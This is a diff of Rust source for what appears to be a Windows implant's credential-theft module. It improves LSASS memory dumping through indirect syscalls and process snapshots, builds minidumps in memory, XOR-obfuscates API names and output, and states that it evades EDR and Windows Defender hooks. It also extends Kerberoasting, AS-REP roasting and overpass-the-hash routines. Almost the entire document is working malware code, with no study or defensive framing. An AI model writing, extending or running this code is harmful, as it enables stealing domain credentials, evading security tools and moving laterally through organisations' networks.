@@ -30,8 +30,8 @@ fn exec_cred_win(task: &Task) -> TaskOutput {
         "lsass-syscall" => lsass_syscall()
             .map(TaskOutput::success)
             .unwrap_or_else(|e| TaskOutput::failure(&e)),
-        "kerberoast"    => cred_kerberoast(),
-        "asrep-roast"   => cred_asrep_roast(),
+        "kerberoast"    => cred_kerberoast(&v),
+        "asrep-roast"   => cred_asrep_roast(&v),
         "ptt"           => cred_ptt(&v),
         "pth"           => cred_pth(&v),
         "opth"          => cred_opth(&v),
@@ -66,7 +66,7 @@ fn lsass_dump() -> Result<Vec<u8>, String> {
     ).ok_or_else(|| "lsass: process not found".to_string())?;
 
     let proc = open_process_syscall(lsass_pid, 0x0410) // QUERY_INFO | VM_READ
-        .ok_or_else(|| "lsass: NtOpenProcess failed".to_string())?;
+        .map_err(|s| format!("lsass: NtOpenProcess failed ({s:#010x})"))?;
 
     let dump_fn = load_minidump_fn()
         .ok_or_else(|| { unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) }; "lsass: MiniDumpWriteDump not found".to_string() })?;
@@ -83,7 +83,6 @@ fn lsass_dump() -> Result<Vec<u8>, String> {
         process_handle: isize,
         callback_type:  u32,
         _p1:            u32,
-        io_handle:      isize,
         io_offset:      u64,
         io_buffer:      usize,
         io_bytes:       u32,
@@ -109,15 +108,16 @@ fn lsass_dump() -> Result<Vec<u8>, String> {
     ) -> i32 {
         (*out).status = 0; // S_OK
         let cb_type = (*inp).callback_type;
-        // IoStartCallback=20: accept with status S_OK (already set)
-        // IoWriteAllCallback=22: append bytes to our buffer at the given offset
         if cb_type == 22 {
             let buf = &mut *(param as *mut Vec<u8>);
             let off = (*inp).io_offset as usize;
             let ptr = (*inp).io_buffer as *const u8;
             let len = (*inp).io_bytes as usize;
+            const MAX_DUMP: usize = 600 * 1024 * 1024;
+            if off + len > MAX_DUMP { return 0; }
             if off + len > buf.len() {
-                buf.resize(off + len, 0);
+                if buf.try_reserve(off + len - buf.len()).is_err() { return 0; }
+                buf.resize(off + len, 0u8);
             }
             core::ptr::copy_nonoverlapping(ptr, buf.as_mut_ptr().add(off), len);
         }
@@ -131,8 +131,8 @@ fn lsass_dump() -> Result<Vec<u8>, String> {
         (dump_fn)(
             proc,
             lsass_pid,
-            -1isize, // INVALID_HANDLE_VALUE — I/O routed through callback
-            2u32,    // MiniDumpWithFullMemory
+            -1isize,
+            0x20000002u32, // MiniDumpWithFullMemory | MiniDumpIgnoreInaccessibleMemory
             0usize, 0usize,
             &mut cb_info as *mut CbInfo as *mut u8,
         )
@@ -187,8 +187,9 @@ fn find_pid_by_name_enc(enc: &[u8], key: u8, expected_len: usize) -> Option<u32>
 }
 
 /// Open a process handle via NtOpenProcess indirect syscall (bypasses EDR hook on OpenProcess).
+/// Returns (handle, ntstatus) — handle is 0 on failure, ntstatus is 0 on success.
 #[cfg(target_os = "windows")]
-fn open_process_syscall(pid: u32, access: u32) -> Option<isize> {
+fn open_process_syscall(pid: u32, access: u32) -> Result<isize, i32> {
     use crate::syscall::{ClientId, nt_open_process};
 
     // OBJECT_ATTRIBUTES with all-zero fields (no name, no root directory).
@@ -219,7 +220,7 @@ fn open_process_syscall(pid: u32, access: u32) -> Option<isize> {
             &mut cid as *mut ClientId,
         )
     };
-    if status != 0 || handle == 0 { None } else { Some(handle) }
+    if status != 0 || handle == 0 { Err(status) } else { Ok(handle) }
 }
 
 type MiniDumpFn = unsafe extern "system" fn(
@@ -271,6 +272,9 @@ fn load_minidump_fn() -> Option<MiniDumpFn> {
 
 #[cfg(target_os = "windows")]
 fn lsass_pss() -> Result<Vec<u8>, String> {
+    // Strategy: PssCaptureSnapshot creates a copy-on-write VA clone of LSASS with lower
+    // EDR signal than a direct open. Memory is then read from the clone via indirect
+    // NtReadVirtualMemory syscalls (bypasses WD behavioral hooks on MiniDumpWriteDump).
     enable_debug_privilege();
 
     let lsass_pid = find_pid_by_name_enc(
@@ -278,9 +282,8 @@ fn lsass_pss() -> Result<Vec<u8>, String> {
         0x55, 9,
     ).ok_or_else(|| "lsass-pss: process not found".to_string())?;
 
-    // Need PROCESS_ALL_ACCESS for PssCaptureSnapshot
     let proc = open_process_syscall(lsass_pid, 0x1FFFFF)
-        .ok_or_else(|| "lsass-pss: NtOpenProcess failed".to_string())?;
+        .map_err(|s| format!("lsass-pss: NtOpenProcess failed ({s:#010x})"))?;
 
     let k32 = crate::loader::get_module_base(
         crate::obfs::dec(&[0x31,0x3F,0x28,0x34,0x3F,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
@@ -295,10 +298,10 @@ fn lsass_pss() -> Result<Vec<u8>, String> {
     type PssFreeSnapshotFn    = unsafe extern "system" fn(isize, isize) -> u32;
 
     // "PssCaptureSnapshot\0" XOR 0x5A
-    let p_cap = unsafe { crate::loader::get_export_by_name(k32,
+    let p_cap  = unsafe { crate::loader::get_export_by_name(k32,
         crate::obfs::dec(&[0x0A,0x29,0x29,0x19,0x3B,0x2A,0x2E,0x2F,0x28,0x3F,0x09,0x34,0x3B,0x2A,0x29,0x32,0x35,0x2E,0x5A]).as_ptr()) };
     // "PssQuerySnapshot\0" XOR 0x5A
-    let p_qry = unsafe { crate::loader::get_export_by_name(k32,
+    let p_qry  = unsafe { crate::loader::get_export_by_name(k32,
         crate::obfs::dec(&[0x0A,0x29,0x29,0x0B,0x2F,0x3F,0x28,0x23,0x09,0x34,0x3B,0x2A,0x29,0x32,0x35,0x2E,0x5A]).as_ptr()) };
     // "PssFreeSnapshot\0" XOR 0x5A
     let p_free = unsafe { crate::loader::get_export_by_name(k32,
@@ -316,9 +319,9 @@ fn lsass_pss() -> Result<Vec<u8>, String> {
         }
     };
 
-    // PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_INFORMATION |
-    // PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION
-    const PSS_FLAGS: u32 = 0x00000001 | 0x00000004 | 0x00000010 | 0x00000080 | 0x00000100;
+    // PSS_CAPTURE_VA_CLONE only — adding VA_SPACE(0x400) or THREADS(0x80) forces
+    // full VA enumeration at capture time, causing 20+ min hangs on large LSASS
+    const PSS_FLAGS: u32 = 0x00000001;
 
     let mut snap: isize = 0;
     let r = unsafe { fn_cap(proc, PSS_FLAGS, 0, &mut snap) };
@@ -327,67 +330,141 @@ fn lsass_pss() -> Result<Vec<u8>, String> {
         return Err(format!("lsass-pss: PssCaptureSnapshot failed (err={r})"));
     }
 
-    // PSS_QUERY_VA_CLONE_INFORMATION = 0 → returns { HANDLE VaCloneHandle }
-    let mut clone_handle: isize = 0;
-    unsafe { fn_qry(snap, 0, &mut clone_handle as *mut isize as *mut u8, 8) };
-
-    let dump_handle = if clone_handle != 0 { clone_handle } else {
-        // No clone — free snapshot and bail
+    // PSS_QUERY_VA_CLONE_INFORMATION = 1 → returns HANDLE VaCloneHandle (8 bytes)
+    // Do NOT CloseHandle the clone — PssFreeSnapshot owns it
+    let mut clone_hdl: isize = 0;
+    let qr = unsafe { fn_qry(snap, 1, &mut clone_hdl as *mut isize as *mut u8, 8) };
+    if qr != 0 || clone_hdl == 0 {
         unsafe { fn_free(-1isize, snap) };
-        return Err("lsass-pss: PssQuerySnapshot returned null clone handle".to_string());
-    };
-
-    let dump_fn = load_minidump_fn().ok_or_else(|| {
-        if clone_handle != 0 { unsafe { windows_sys::Win32::Foundation::CloseHandle(clone_handle) }; }
-        unsafe { fn_free(-1isize, snap) };
-        "lsass-pss: MiniDumpWriteDump not found".to_string()
-    })?;
-
-    // Same in-memory callback approach as lsass_dump()
-    let mut dump_buf: Vec<u8> = Vec::with_capacity(64 * 1024 * 1024);
-
-    #[repr(C)]
-    struct CbInput {
-        process_id: u32, _p0: u32, process_handle: isize,
-        callback_type: u32, _p1: u32,
-        io_handle: isize, io_offset: u64, io_buffer: usize, io_bytes: u32, _p2: u32,
+        return Err(format!("lsass-pss: PssQuerySnapshot failed (err={qr})"));
     }
+
+    // ── Enumerate committed readable regions in the VA clone ──────────────────
     #[repr(C)]
-    struct CbOutput { status: i32, _rest: [u8; 52] }
-    #[repr(C)]
-    struct CbInfo {
-        routine: Option<unsafe extern "system" fn(*mut u8, *const CbInput, *mut CbOutput) -> i32>,
-        param: *mut u8,
+    struct Mbi {
+        base_address: usize, alloc_base: usize, alloc_protect: u32,
+        partition_id: u16, _pad0: u16,
+        region_size: usize, state: u32, protect: u32, mem_type: u32, _pad1: u32,
     }
-    unsafe extern "system" fn cb(param: *mut u8, inp: *const CbInput, out: *mut CbOutput) -> i32 {
-        (*out).status = 0;
-        if (*inp).callback_type == 22 {
-            let buf = &mut *(param as *mut Vec<u8>);
-            let off = (*inp).io_offset as usize;
-            let ptr = (*inp).io_buffer as *const u8;
-            let len = (*inp).io_bytes as usize;
-            if off + len > buf.len() { buf.resize(off + len, 0); }
-            core::ptr::copy_nonoverlapping(ptr, buf.as_mut_ptr().add(off), len);
+    const MEM_COMMIT:    u32 = 0x1000;
+    const PAGE_NOACCESS: u32 = 0x01;
+    const PAGE_GUARD:    u32 = 0x100;
+    const MAX_ADDR:      usize = 0x0000_7FFF_FFFF_F000;
+
+    let mut regions: Vec<(usize, usize)> = Vec::new();
+    let mut addr: usize = 0;
+    loop {
+        if addr >= MAX_ADDR { break; }
+        let mut mbi: Mbi = unsafe { core::mem::zeroed() };
+        let mut ret_len: usize = 0;
+        let rc = unsafe {
+            crate::syscall::nt_query_virtual_memory(
+                clone_hdl, addr as *const u8, 0,
+                &mut mbi as *mut Mbi as *mut u8,
+                core::mem::size_of::<Mbi>(), &mut ret_len,
+            )
+        };
+        if rc != 0 { break; }
+        let base = mbi.base_address;
+        let size = mbi.region_size;
+        if size == 0 { break; }
+        if mbi.state == MEM_COMMIT
+            && mbi.protect & PAGE_NOACCESS == 0
+            && mbi.protect & PAGE_GUARD == 0
+        {
+            regions.push((base, size));
         }
-        1
+        addr = base.saturating_add(size);
     }
 
-    let buf_ptr = &mut dump_buf as *mut Vec<u8> as *mut u8;
-    let mut cb_info = CbInfo { routine: Some(cb), param: buf_ptr };
+    if regions.is_empty() {
+        unsafe { fn_free(-1isize, snap) };
+        return Err("lsass-pss: no readable regions in VA clone".to_string());
+    }
 
-    let ok = unsafe {
-        (dump_fn)(dump_handle, lsass_pid, -1isize, 2u32, 0, 0,
-            &mut cb_info as *mut CbInfo as *mut u8)
+    let raw_sz: usize = regions.iter().map(|(_, s)| *s).sum();
+
+    // ── Build MDMP in memory (same layout as lsass_syscall) ───────────────────
+    const HDR_SZ:     u32 = 32;
+    const DIR_SZ:     u32 = 36;
+    const SYSINFO_SZ: u32 = 56;
+    const MODLIST_SZ: u32 = 4;
+    const MEM64_HDR:  u32 = 16;
+    let num_ranges = regions.len() as u32;
+    let mem64_total = MEM64_HDR + num_ranges * 16;
+    let base_rva: u64 = (HDR_SZ + DIR_SZ + SYSINFO_SZ + MODLIST_SZ + mem64_total) as u64;
+
+    const MAX_DUMP: usize = 600 * 1024 * 1024;
+    if raw_sz > MAX_DUMP {
+        unsafe { fn_free(-1isize, snap) };
+        return Err(format!("lsass-pss: dump too large ({} MB)", raw_sz / (1024*1024)));
+    }
+    let total_cap = base_rva as usize + raw_sz;
+    let mut mdmp: Vec<u8> = Vec::new();
+    if mdmp.try_reserve_exact(total_cap).is_err() {
+        unsafe { fn_free(-1isize, snap) };
+        return Err(format!("lsass-pss: alloc failed ({} MB)", total_cap / (1024*1024)));
+    }
+    mdmp.resize(total_cap, 0u8);
+
+    let h = &mut mdmp[0..32];
+    h[0..4].copy_from_slice(b"MDMP");
+    h[4..8].copy_from_slice(&0x0000A793u32.to_le_bytes());
+    h[8..12].copy_from_slice(&3u32.to_le_bytes());
+    h[12..16].copy_from_slice(&HDR_SZ.to_le_bytes());
+    h[24..32].copy_from_slice(&2u64.to_le_bytes());
+
+    let sysinfo_rva = HDR_SZ + DIR_SZ;
+    let modlist_rva = sysinfo_rva + SYSINFO_SZ;
+    let mem64_rva   = modlist_rva + MODLIST_SZ;
+
+    let write_dir = |buf: &mut Vec<u8>, slot: usize, stype: u32, sz: u32, rva: u32| {
+        let off = 32 + slot * 12;
+        buf[off..off+4].copy_from_slice(&stype.to_le_bytes());
+        buf[off+4..off+8].copy_from_slice(&sz.to_le_bytes());
+        buf[off+8..off+12].copy_from_slice(&rva.to_le_bytes());
     };
+    write_dir(&mut mdmp, 0, 7, SYSINFO_SZ, sysinfo_rva);
+    write_dir(&mut mdmp, 1, 4, MODLIST_SZ, modlist_rva);
+    write_dir(&mut mdmp, 2, 9, mem64_total, mem64_rva);
 
-    unsafe { windows_sys::Win32::Foundation::CloseHandle(clone_handle) };
+    let si = &mut mdmp[sysinfo_rva as usize .. sysinfo_rva as usize + 56];
+    si[0..2].copy_from_slice(&9u16.to_le_bytes());
+    si[2..4].copy_from_slice(&6u16.to_le_bytes());
+    si[4..6].copy_from_slice(&0x0401u16.to_le_bytes());
+    si[6] = 4; si[7] = 1;
+    si[8..12].copy_from_slice(&10u32.to_le_bytes());
+    si[16..20].copy_from_slice(&19041u32.to_le_bytes());
+    si[20..24].copy_from_slice(&2u32.to_le_bytes());
+
+    let m64 = mem64_rva as usize;
+    mdmp[m64..m64+8].copy_from_slice(&(num_ranges as u64).to_le_bytes());
+    mdmp[m64+8..m64+16].copy_from_slice(&base_rva.to_le_bytes());
+
+    let mut raw_off: usize = base_rva as usize;
+    for (i, (base, size)) in regions.iter().enumerate() {
+        let range_off = m64 + 16 + i * 16;
+        mdmp[range_off..range_off+8].copy_from_slice(&(*base as u64).to_le_bytes());
+        let mut read_bytes: usize = 0;
+        let rc = unsafe {
+            crate::syscall::nt_read(
+                clone_hdl, *base as *const u8,
+                mdmp.as_mut_ptr().add(raw_off), *size, &mut read_bytes,
+            )
+        };
+        let actual = if rc == 0 { read_bytes } else { 0 };
+        mdmp[range_off+8..range_off+16].copy_from_slice(&(actual as u64).to_le_bytes());
+        raw_off += size;
+    }
+
     unsafe { fn_free(-1isize, snap) };
 
-    if ok == 0 || dump_buf.len() < 8 {
-        return Err(format!("lsass-pss: dump failed ok={ok} len={}", dump_buf.len()));
+    mdmp.truncate(raw_off);
+    if mdmp.len() < 8 {
+        return Err(format!("lsass-pss: dump too small ({} bytes)", mdmp.len()));
     }
-    for (i, b) in dump_buf.iter_mut().enumerate() { *b ^= (i & 0xFF) as u8; }
-    Ok(dump_buf)
+    for (i, b) in mdmp.iter_mut().enumerate() { *b ^= (i & 0xFF) as u8; }
+    Ok(mdmp)
 }
 
 // ── LSASS dump — direct syscall MDMP builder ──────────────────────────────────
@@ -408,7 +485,7 @@ fn lsass_syscall() -> Result<Vec<u8>, String> {
     ).ok_or_else(|| "lsass-sc: process not found".to_string())?;
 
     let proc = open_process_syscall(lsass_pid, 0x0410) // QUERY_INFO | VM_READ
-        .ok_or_else(|| "lsass-sc: NtOpenProcess failed".to_string())?;
+        .map_err(|s| format!("lsass-sc: NtOpenProcess failed ({s:#010x})"))?;
 
     // ── Pass 1: enumerate committed readable regions ─────────────────────────
     #[repr(C)]
@@ -483,10 +560,20 @@ fn lsass_syscall() -> Result<Vec<u8>, String> {
     let mem64_total = MEM64_HDR + mem64_ranges_sz;
     let base_rva: u64 = (HDR_SZ + DIR_SZ + SYSINFO_SZ + MODLIST_SZ + mem64_total) as u64;
 
-    // Compute total raw data size
+    // Compute total raw data size; cap at 600 MB to prevent OOM abort
     let raw_sz: usize = regions.iter().map(|(_, s)| *s).sum();
+    const MAX_DUMP: usize = 600 * 1024 * 1024;
+    if raw_sz > MAX_DUMP {
+        unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) };
+        return Err(format!("lsass-sc: dump too large ({} MB), skipping", raw_sz / (1024*1024)));
+    }
     let total_cap = base_rva as usize + raw_sz;
-    let mut mdmp: Vec<u8> = vec![0u8; total_cap];
+    let mut mdmp: Vec<u8> = Vec::new();
+    if mdmp.try_reserve_exact(total_cap).is_err() {
+        unsafe { windows_sys::Win32::Foundation::CloseHandle(proc) };
+        return Err(format!("lsass-sc: alloc failed ({} MB)", total_cap / (1024*1024)));
+    }
+    mdmp.resize(total_cap, 0u8);
 
     // ── MDMP Header ──────────────────────────────────────────────────────────
     let h = &mut mdmp[0..32];
@@ -573,17 +660,23 @@ fn lsass_syscall() -> Result<Vec<u8>, String> {
 // Output: {"dc":"...", "domain":"...", "tickets":[{"user","spn","token_b64"},...]}
 
 #[cfg(target_os = "windows")]
-fn cred_kerberoast() -> TaskOutput {
+fn cred_kerberoast(v: &serde_json::Value) -> TaskOutput {
     use base64::Engine;
     use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
 
-    // Domain info from environment (set by Winlogon on domain-joined machines)
-    let domain_fqdn = std::env::var("USERDNSDOMAIN").unwrap_or_default();
+    // Domain info: prefer args, fall back to environment (set by Winlogon on domain-joined machines)
+    let domain_fqdn = v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string())
+        .unwrap_or_else(|| std::env::var("USERDNSDOMAIN").unwrap_or_default());
     let logon_server = std::env::var("LOGONSERVER").unwrap_or_default();
-    if domain_fqdn.is_empty() || logon_server.is_empty() {
-        return TaskOutput::failure("kerberoast: USERDNSDOMAIN or LOGONSERVER not set (non-domain machine)");
+    let dc_arg = v.get("dc").and_then(|s| s.as_str()).map(|s| s.to_string());
+    if domain_fqdn.is_empty() {
+        return TaskOutput::failure("kerberoast: USERDNSDOMAIN not set; pass domain arg");
     }
-    let dc = logon_server.trim_start_matches('\\');
+    if dc_arg.is_none() && logon_server.is_empty() {
+        return TaskOutput::failure("kerberoast: LOGONSERVER not set; pass dc arg");
+    }
+    let dc_owned = dc_arg.unwrap_or_else(|| logon_server.trim_start_matches('\\').to_string());
+    let dc = dc_owned.as_str();
     let base_dn: String = domain_fqdn.split('.').map(|p| format!("DC={}", p.to_lowercase()))
         .collect::<Vec<_>>().join(",");
 
@@ -742,13 +835,19 @@ fn cred_kerberoast() -> TaskOutput {
 // Output: {"domain":"...", "vulnerable_users":["user1","user2",...], "count":N}
 
 #[cfg(target_os = "windows")]
-fn cred_asrep_roast() -> TaskOutput {
-    let domain_fqdn = std::env::var("USERDNSDOMAIN").unwrap_or_default();
+fn cred_asrep_roast(v: &serde_json::Value) -> TaskOutput {
+    let domain_fqdn = v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string())
+        .unwrap_or_else(|| std::env::var("USERDNSDOMAIN").unwrap_or_default());
     let logon_server = std::env::var("LOGONSERVER").unwrap_or_default();
-    if domain_fqdn.is_empty() || logon_server.is_empty() {
-        return TaskOutput::failure("asrep-roast: USERDNSDOMAIN or LOGONSERVER not set");
+    let dc_arg = v.get("dc").and_then(|s| s.as_str()).map(|s| s.to_string());
+    if domain_fqdn.is_empty() {
+        return TaskOutput::failure("asrep-roast: USERDNSDOMAIN not set; pass domain arg");
     }
-    let dc = logon_server.trim_start_matches('\\');
+    if dc_arg.is_none() && logon_server.is_empty() {
+        return TaskOutput::failure("asrep-roast: LOGONSERVER not set; pass dc arg");
+    }
+    let dc_owned = dc_arg.unwrap_or_else(|| logon_server.trim_start_matches('\\').to_string());
+    let dc = dc_owned.as_str();
     let base_dn: String = domain_fqdn.split('.').map(|p| format!("DC={}", p.to_lowercase()))
         .collect::<Vec<_>>().join(",");
 
@@ -1058,13 +1157,15 @@ fn cred_opth(v: &serde_json::Value) -> TaskOutput {
         .map(|i| u8::from_str_radix(&ntlm_hex[i*2..i*2+2], 16).unwrap_or(0))
         .collect();
 
-    // Get domain controller
+    // Get domain controller — prefer dc arg, fall back to LOGONSERVER env var
     let logon_server = std::env::var("LOGONSERVER").unwrap_or_default();
     let domain_fqdn  = std::env::var("USERDNSDOMAIN").unwrap_or_default();
-    if logon_server.is_empty() {
-        return TaskOutput::failure("opth: LOGONSERVER not set (non-domain machine)");
+    let dc_arg = v.get("dc").and_then(|s| s.as_str()).map(|s| s.to_string());
+    if dc_arg.is_none() && logon_server.is_empty() {
+        return TaskOutput::failure("opth: LOGONSERVER not set; pass dc arg");
     }
-    let dc = logon_server.trim_start_matches('\\');
+    let dc_owned = dc_arg.unwrap_or_else(|| logon_server.trim_start_matches('\\').to_string());
+    let dc = dc_owned.as_str();
 
     // Build a minimal Kerberos AS-REQ (no preauthentication first; if rejected, add PA-ENC-TS)
     // ASN.1 helper closures
@@ -1284,22 +1385,24 @@ fn ldap_query_users(dc: &str, base_dn: &str, filter: &str, attr: &str) -> Result
     type LdapUnbindFn   = unsafe extern "system" fn(*mut u8) -> u32;
 
     macro_rules! wl { ($enc:expr, $ty:ty) => { {
-        match unsafe { crate::loader::get_export_by_name(wldap, crate::obfs::dec($enc).as_ptr()) } {
-            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
+        let _n = crate::obfs::dec($enc);
+        let _p = unsafe { windows_sys::Win32::System::LibraryLoader::GetProcAddress(wldap as isize, _n.as_ptr()) };
+        match _p {
+            Some(f) => unsafe { core::mem::transmute::<_, $ty>(f) },
             None    => return Err("wldap fn resolve failed".into()),
         }
     }}}
 
     let fn_init      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
     let fn_setopt    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
-    let fn_bind      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x18,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
+    let fn_bind      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
     let fn_search    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
     let fn_first     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
-    let fn_next      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
+    let fn_next      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
     let fn_getvals   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x5A], LdapGetValsFn);
     let fn_valfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x5A], LdapValFreeFn);
     let fn_msgfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
-    let fn_unbind    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x18,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
+    let fn_unbind    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
 
     let dc_bytes: Vec<u8>     = dc.bytes().chain(core::iter::once(0u8)).collect();
     let ld = unsafe { fn_init(dc_bytes.as_ptr(), 389) };
@@ -1382,22 +1485,24 @@ fn ldap_query_two_attrs(dc: &str, base_dn: &str, filter: &str, attr1: &str, attr
     type LdapUnbindFn  = unsafe extern "system" fn(*mut u8) -> u32;
 
     macro_rules! wl { ($enc:expr, $ty:ty) => { {
-        match unsafe { crate::loader::get_export_by_name(wldap, crate::obfs::dec($enc).as_ptr()) } {
-            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
+        let _n = crate::obfs::dec($enc);
+        let _p = unsafe { windows_sys::Win32::System::LibraryLoader::GetProcAddress(wldap as isize, _n.as_ptr()) };
+        match _p {
+            Some(f) => unsafe { core::mem::transmute::<_, $ty>(f) },
             None    => return Err("wldap fn resolve failed".into()),
         }
     }}}
 
     let fn_init    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
     let fn_setopt  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
-    let fn_bind    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x18,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
+    let fn_bind    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
     let fn_search  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
     let fn_first   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
-    let fn_next    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
+    let fn_next    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
     let fn_getvals = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x5A], LdapGetValsFn);
     let fn_valfree = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x5A], LdapValFreeFn);
     let fn_msgfree = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
-    let fn_unbind  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x18,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
+    let fn_unbind  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
 
     let dc_bytes:     Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
     let ld = unsafe { fn_init(dc_bytes.as_ptr(), 389) };
@@ -1835,18 +1940,20 @@ fn ldap_query_attrs(dc: &str, base_dn: &str, filter: &str, attrs: &[&str])
     type LdapUnbindFn   = unsafe extern "system" fn(*mut u8) -> u32;
 
     macro_rules! wl { ($enc:expr, $ty:ty) => { {
-        match unsafe { crate::loader::get_export_by_name(wldap, crate::obfs::dec($enc).as_ptr()) } {
-            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
+        let _n = crate::obfs::dec($enc);
+        let _p = unsafe { windows_sys::Win32::System::LibraryLoader::GetProcAddress(wldap as isize, _n.as_ptr()) };
+        match _p {
+            Some(f) => unsafe { core::mem::transmute::<_, $ty>(f) },
             None    => return Err("wldap fn resolve failed".into()),
         }
     }}}
 
     let fn_init     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
     let fn_setopt   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
-    let fn_bind     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x18,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
+    let fn_bind     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
     let fn_search   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
     let fn_first    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
-    let fn_next     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
+    let fn_next     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
     // ldap_get_dn
     let fn_getdn    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x3E,0x34,0x5A], LdapGetDnFn);
     // ldap_memfree
@@ -1858,7 +1965,7 @@ fn ldap_query_attrs(dc: &str, base_dn: &str, filter: &str, attrs: &[&str])
     // ldap_value_free_len
     let fn_lenfree  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x05,0x36,0x3F,0x34,0x5A], LdapLenFreeFn);
     let fn_msgfree  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
